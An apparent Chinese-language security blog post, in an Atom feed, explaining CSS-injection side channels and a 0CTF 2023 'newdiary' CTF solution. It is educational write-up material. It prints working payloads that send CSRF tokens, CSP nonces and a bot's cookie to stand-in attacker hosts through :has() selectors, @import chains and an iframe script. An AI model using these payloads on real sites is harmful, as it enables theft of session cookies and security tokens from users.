<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2023-12-13T10:00:51+08:00</updated><id>/feed.xml</id><title type="html">DumKiy’s blog</title><subtitle>Watch And Learn
</subtitle><author><name>DumKiy</name></author><entry><title type="html">前端安全：CSS 注入</title><link href="/css/2023/12/12/CSS-injection.html" rel="alternate" type="text/html" title="前端安全：CSS 注入" /><published>2023-12-12T18:29:48+08:00</published><updated>2023-12-12T18:29:48+08:00</updated><id>/css/2023/12/12/CSS-injection</id><content type="html" xml:base="/css/2023/12/12/CSS-injection.html"><![CDATA[<h1 id="前端安全css-注入">前端安全：CSS 注入</h1>
<p>css 注入通常用于窃取页面敏感信息，例如 csrf-token，csp 中的 nonce 值等。通常配合 xss、csrf 漏洞一同使用。</p>
<h2 id="css-注入原理">CSS 注入原理</h2>
<p>下面的 payload 展示了一个窃取 csrf-token 的示例。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE html&gt;

&lt;<span class="nb">head</span><span class="o">&gt;</span>
    &lt;style&gt;
        form:has<span class="o">(</span>input[name<span class="o">=</span><span class="s2">"csrf-token"</span><span class="o">][</span>value^<span class="o">=</span><span class="s2">"a"</span><span class="o">]){</span>
            background: url<span class="o">(</span><span class="s2">"http://attacker/?q=a"</span><span class="o">)</span><span class="p">;</span>
        <span class="o">}</span>
    &lt;/style&gt;
    &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
&lt;/head&gt;

&lt;body&gt;
    &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">"/action"</span><span class="o">&gt;</span>
        &lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span><span class="o">&gt;</span>
        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span><span class="o">&gt;</span>
        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"csrf-token"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"abc123"</span><span class="o">&gt;</span>
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>
<p>在这个 payload 中，我们使用 has 选择器，从 form 表单中选择满足 name=”csrf-token”，value 以 a 开头的 input 标签，如果能够获取到这样的标签，就通过 background 加载远程图片。</p>

<p>换句话来说，如果能够插入这样一行 css 代码，并且 csrf-token 确实以 a 开头，那么就能够受到一个请求。通过遍历就可以确认第一个字符。</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"a"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"b"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"c"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">...</span>
</code></pre></div></div>
<p>得到第一个字符后（假设为 a），就可以开始遍历第二个字符。</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"aa"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ab"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ac"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">...</span>
</code></pre></div></div>
<p>利用这样侧信道的方式，循环遍历就可以获取到所有的 csrf-token。</p>

<p>但其中存在一个问题，如果要一次将所有 payload 注入进去，大小写字母及数字加起来 62 个，如果要遍历每种组合的话 payload 将会非常长，特别是 token 长度一般也不会短。</p>

<p>如果分段注入呢？例如先注入猜解第一个字符的 payload，确认第一个字符之后，再注入猜解第二个字符的 payload。但这又会出现一个问题，页面需要进行刷新才能加载新的 payload，而刷新之后，csrf-token 往往会发生变化。</p>

<p>Pepe Vila 在 2019 提出了新的利用方式：@import，可以在不刷新页面的情况下，分阶段加载 css。</p>

<p>@import 可以进一步加载其他的 css。示例 payload 如下：</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">@import</span> <span class="sx">url(https://myserver.com/start?len=8)</span>
</code></pre></div></div>
<p>攻击者服务器可以回复下面的 payload，此时客户端会逐个请求。</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">@import</span> <span class="sx">url(https://myserver.com/payload?len=1)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=2)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=3)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=4)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=5)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=6)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=7)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=8)</span>
</code></pre></div></div>
<p>客户端请求 payload?len=1 时，攻击者可以回复枚举第一个字符的 payload。</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"a"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"b"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"c"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">...</span>
</code></pre></div></div>
<p>第一个字符确认后，再生成 payload?len=2 的响应内容，客户端此时请求该 url 时，攻击者就可以回复特定的 payload。</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"aa"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ab"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ac"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">...</span>
</code></pre></div></div>
<p>后面的过程依次类推。</p>

<p>这种方式也有一些需要注意的地方：</p>
<ol>
  <li>浏览器对同一个域名发起的请求有上限。如果请求太多仍旧会被限制，但也可以通过设置多个子域名来绕过限制，比如 a.attacker.com，b.attacker.com。</li>
  <li>firefox 下 payload 有所不同，原因在于 firefox 不会逐个 import css，而是一次性加载，这样就达不到分阶段确认字符的目的。 Michał Bentkowski 的文章提出了解决办法：<a href="https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/">CSS data exfiltration in Firefox via a single injection point - research.securitum.com</a></li>
</ol>

<p>chrome 和 firefox 通用 payload：</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nt">style</span><span class="o">&gt;</span><span class="k">@import</span> <span class="sx">url(https://myserver.com/payload?len=1)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=2)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=3)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=4)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=5)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=6)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=7)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=8)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
</code></pre></div></div>

<h2 id="更快的枚举">更快的枚举</h2>
<p>文章 <a href="https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/">Code Vulnerabilities Put Proton Mails at Risk - Sonar</a> 展示了一种更快的枚举方式。</p>

<p>通过示例代码可以更好地理解：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="nb">head</span><span class="o">&gt;</span>
    &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
    &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Security-Policy"</span>
      <span class="nv">content</span><span class="o">=</span><span class="s2">"script-src 'nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline'"</span><span class="o">&gt;</span>
  &lt;/head&gt;
  &lt;style&gt;
    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aaa"</span><span class="o">]){</span><span class="nt">--tosend-aaa</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aaa<span class="o">)</span><span class="p">;</span><span class="o">}</span>
    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aab"</span><span class="o">]){</span><span class="nt">--tosend-aab</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aab<span class="o">)</span><span class="p">;</span><span class="o">}</span>
    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aac"</span><span class="o">]){</span><span class="nt">--tosend-aac</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aac<span class="o">)</span><span class="p">;</span><span class="o">}</span>

    input<span class="o">{</span>
        background: var<span class="o">(</span><span class="nt">--tosend-aaa</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aab</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aac</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aad</span>, none<span class="o">)</span>
    <span class="o">}</span>

  &lt;/style&gt;
  &lt;body&gt;
    &lt;input&gt;
    &lt;script <span class="nv">nonce</span><span class="o">=</span><span class="s2">"nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1"</span><span class="o">&gt;</span>
        console.log<span class="o">(</span>1<span class="o">)</span>
    &lt;/script&gt;
  &lt;/body&gt;
</code></pre></div></div>
<p>页面中的 CSP 设置了 nonce 值，只有 nonce 属性值与 CSP 中设置的值相同的 JS 内链脚本才能够被执行，这个机制通常用于 XSS 防护。攻击者需要窃取到该值才能够正常运行 XSS。</p>

<p>其中 css 注入 payload 如下。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aaa"</span><span class="o">]){</span><span class="nt">--tosend-aaa</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aaa<span class="o">)</span><span class="p">;</span><span class="o">}</span>

    input<span class="o">{</span>
        background: var<span class="o">(</span><span class="nt">--tosend-aaa</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aab</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aac</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aad</span>, none<span class="o">)</span>
    <span class="o">}</span>
</code></pre></div></div>
<p>其作用就是在页面选择 nonce 值包含了 aaa 的 script 标签（<code class="language-plaintext highlighter-rouge">*=</code> 表示 nonce 值含有 aaa 时），如果能够选择到，则设定一个自定义属性 tosend-aaa（自定义属性以 – 开头），通过这个属性向外发起请求。</p>

<p>定义 input 样式的作用在于调用自定义参数，从而触发向外的请求，换用其他标签也同样可以，例如 div。</p>

<p>由于 nonce 中存在 aaa，因此可以受到一个 aaa 的请求：</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212195241.png" alt="20231212195241" /></p>

<p>如何获取完整的字符串呢？假设 none 值为 32 位随机字符串：
qhkkzvf5mc3iv090nyysyq6wc80ai4v1</p>

<p>我们可以通过上面的方式，每次获取 3 位的子串，获取到 30 个不重复的子串，通过回溯的方式即可恢复整个字符串。比如 f5m 的后两位为 5m, 5m 又是 5mc 的开头，那么就可以确认 f5m 后一个字符为 c。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="sh">'</span><span class="s">f5m</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">c3i</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">i4v</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">3iv</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">zvf</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">iv0</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">syq</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">0ai</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">6wc</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">kkz</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">yq6</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">q6w</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">5mc</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">c80</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">4v1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ysy</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">0ny</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">yys</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ai4</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">090</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">v09</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">nyy</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">mc3</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">hkk</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">qhk</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">vf5</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">kzv</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">wc8</span><span class="sh">'</span><span class="p">}</span>
</code></pre></div></div>
<p>这样一来，只需要较少的请求就可以获取完整的字符串。</p>

<h2 id="0ctf-2023-newdiary">0CTF 2023 newdiary</h2>
<p>前几天的 0CTF 2023 newdiary 这道题就是考察的 CSS 注入的利用。</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212200326.png" alt="20231212200326" /></p>

<p>题目设定了一个 XSS 的场景，用户可以发布内容并分享给后台 bot，bot 的 cookie 设定为 FLAG，因此我们需要通过 XSS 获取到 FLAG。</p>

<p>题目没有进行 XSS 的过滤，但设定了 CSP，即使能够插入 js 代码，由于无法确认 nonce 值，代码也无法执行。</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Content-Security-Policy"</span>
      <span class="na">content=</span><span class="s">"script-src 'nonce-qhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com"</span><span class="nt">&gt;</span>
</code></pre></div></div>
<p>但 CSP style-src 设置为 ‘unsafe-inline’ https://unpkg.com”，允许内联执行，并信任来自 unpkg.com 的 css，所以这道题的思路就是利用 css 注入来窃取 nonce 值。</p>

<p>利用步骤如下：</p>
<ol>
  <li>新建一个笔记 redirect，id 为 0，内容如下，该 payload 可以达成重定向的效果。在无法使用 js 时，可以通过 mata 来完成重定向，meta 标签通常不会被过滤。
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"refresh"</span> <span class="na">content=</span><span class="s">"0.0;url=http://192.168.137.98:8888/index.html"</span><span class="nt">&gt;</span> 
</code></pre></div>    </div>
    <p>其中 index.html 内容如下：</p>
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">&lt;!DOCTYPE html&gt;</span>
 <span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;head&gt;</span>
     <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;title&gt;</span>Document<span class="nt">&lt;/title&gt;</span>
 <span class="nt">&lt;/head&gt;</span>
 <span class="nt">&lt;body&gt;</span>
        
     <span class="nt">&lt;script&gt;</span>
         <span class="kd">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="p">(</span><span class="nx">milliseconds</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">milliseconds</span><span class="p">));</span>
         <span class="k">async</span> <span class="kd">function</span> <span class="nf">run</span><span class="p">(){</span>
             <span class="nx">bot_window</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://localhost/share/read#id=1&amp;username=</span><span class="dl">"</span><span class="p">);</span> <span class="c1">// Exploit 1, leak nonce</span>
             <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">7000</span><span class="p">);</span>

             <span class="nx">bot_window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://localhost/share/read#id=2&amp;username=</span><span class="dl">"</span><span class="p">;</span> <span class="c1">// Exploit 2, leak cookie</span>
             <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
             <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">O</span><span class="dl">"</span><span class="p">);</span>
         <span class="p">}</span>
         <span class="nf">run</span><span class="p">();</span>
     <span class="nt">&lt;/script&gt;</span>
 <span class="nt">&lt;/body&gt;</span>
 <span class="nt">&lt;/html&gt;</span>
</code></pre></div>    </div>
    <p>其主要功能是让 bot 通过 window.open 打开新的标签，然后访问 id=1 的笔记。等待一段时间后，再重定向到 id=2 的笔记。</p>
  </li>
  <li>新建一个笔记 steal，id 为 1,内容为窃取 nonce 值的 css 脚本。由于题目信任来自 unpkg.com 的 css 文件，我们可以先将泄露 nonce 值的 css 上传到 unpkg.com 中。
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"http://unpkg.com/xxx/leak.css"</span><span class="nt">&gt;&lt;input</span> <span class="nt">/&gt;</span>
</code></pre></div>    </div>
  </li>
  <li>当 bot 访问 id=0 的笔记时，会被重定向到攻击者页面，打开新的标签页，访问 id=1 的笔记。接着加载 leak.css 泄流出 id=1 页面的 nonce 值。此时 bot 进入等待时间。</li>
  <li>枚举到 nonce 值后，新建一个笔记 flag，id 为 2，写入获取 cookie 值的 payload，nonce 值为刚才窃取到的值
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;iframe <span class="nv">name</span><span class="o">=</span>asd <span class="nv">srcdoc</span><span class="o">=</span><span class="s2">"&lt;script nonce=xxxx &gt;top.location='http://attacker/flag?flag='+encodeURI(document['cookie'])&lt;/script&gt;"</span>/&gt;
</code></pre></div>    </div>
    <p>因为页面设置了 script-src 为 nonce，禁止了 js 脚本的内联执行，因此这里使用 iframe 打开子窗口来加载 js 代码。</p>
  </li>
  <li>bot 结束等待时间，访问 id=2 的页面，执行 js 代码将 cookie 发送到远程。</li>
</ol>

<p>这里需要注意的是，页面的重定向（刷新）通常会导致 nonce 值发生变化，但题目环境是通过 url 中的 hash 值（# 之后的部分）来更新页面内容的，nonce 值有一个特点，# 之后的部分改变时，nonce 值不会发生变化，这也是这道题的一个关键点。</p>

<p>题目 payload 可参考：<a href="https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md">CTF-Writeups/0ctf - 2023/newdiary/README.md at main · salvatore-abello/CTF-Writeups</a></p>

<p>使用时注意将 index.html 放在 tempalte 目录下。启动 server.py 后，访问 /exploit。</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212203249.png" alt="20231212203249" /></p>

<h1 id="参考">参考</h1>
<ul>
  <li><a href="https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md">CTF-Writeups/0ctf - 2023/newdiary/README.md at main · salvatore-abello/CTF-Writeups</a></li>
  <li><a href="https://aszx87410.github.io/beyond-xss/">Beyond XSS</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="CSS" /><category term="CSS" /><category term="0ctf 2023" /><summary type="html"><![CDATA[前端安全：CSS 注入 css 注入通常用于窃取页面敏感信息，例如 csrf-token，csp 中的 nonce 值等。通常配合 xss、csrf 漏洞一同使用。 CSS 注入原理 下面的 payload 展示了一个窃取 csrf-token 的示例。 &lt;!DOCTYPE html&gt; &lt;head&gt; &lt;style&gt; form:has(input[name="csrf-token"][value^="a"]){ background: url("http://attacker/?q=a"); } &lt;/style&gt; &lt;meta charset="UTF-8"&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="/action"&gt; &lt;input name="username"&gt; &lt;input type="submit"&gt; &lt;input type="hidden" name="csrf-token" value="abc123"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 在这个 payload 中，我们使用 has 选择器，从 form 表单中选择满足 name=”csrf-token”，value 以 a 开头的 input 标签，如果能够获取到这样的标签，就通过 background 加载远程图片。 换句话来说，如果能够插入这样一行 css 代码，并且 csrf-token 确实以 a 开头，那么就能够受到一个请求。通过遍历就可以确认第一个字符。 form:has(input[name="csrf-token"][value^="a"]){ background: url("http://attacker/?q=a"); } form:has(input[name="csrf-token"][value^="b"]){ background: url("http://attacker/?q=b"); } form:has(input[name="csrf-token"][value^="c"]){ background: url("http://attacker/?q=c"); } ... 得到第一个字符后（假设为 a），就可以开始遍历第二个字符。 form:has(input[name="csrf-token"][value^="aa"]){ background: url("http://attacker/?q=a"); } form:has(input[name="csrf-token"][value^="ab"]){ background: url("http://attacker/?q=b"); } form:has(input[name="csrf-token"][value^="ac"]){ background: url("http://attacker/?q=c"); } ... 利用这样侧信道的方式，循环遍历就可以获取到所有的 csrf-token。 但其中存在一个问题，如果要一次将所有 payload 注入进去，大小写字母及数字加起来 62 个，如果要遍历每种组合的话 payload 将会非常长，特别是 token 长度一般也不会短。 如果分段注入呢？例如先注入猜解第一个字符的 payload，确认第一个字符之后，再注入猜解第二个字符的 payload。但这又会出现一个问题，页面需要进行刷新才能加载新的 payload，而刷新之后，csrf-token 往往会发生变化。 Pepe Vila 在 2019 提出了新的利用方式：@import，可以在不刷新页面的情况下，分阶段加载 css。 @import 可以进一步加载其他的 css。示例 payload 如下： @import url(https://myserver.com/start?len=8) 攻击者服务器可以回复下面的 payload，此时客户端会逐个请求。 @import url(https://myserver.com/payload?len=1) @import url(https://myserver.com/payload?len=2) @import url(https://myserver.com/payload?len=3) @import url(https://myserver.com/payload?len=4) @import url(https://myserver.com/payload?len=5) @import url(https://myserver.com/payload?len=6) @import url(https://myserver.com/payload?len=7) @import url(https://myserver.com/payload?len=8) 客户端请求 payload?len=1 时，攻击者可以回复枚举第一个字符的 payload。 form:has(input[name="csrf-token"][value^="a"]){ background: url("http://attacker/?q=a"); } form:has(input[name="csrf-token"][value^="b"]){ background: url("http://attacker/?q=b"); } form:has(input[name="csrf-token"][value^="c"]){ background: url("http://attacker/?q=c"); } ... 第一个字符确认后，再生成 payload?len=2 的响应内容，客户端此时请求该 url 时，攻击者就可以回复特定的 payload。 form:has(input[name="csrf-token"][value^="aa"]){ background: url("http://attacker/?q=a"); } form:has(input[name="csrf-token"][value^="ab"]){ background: url("http://attacker/?q=b"); } 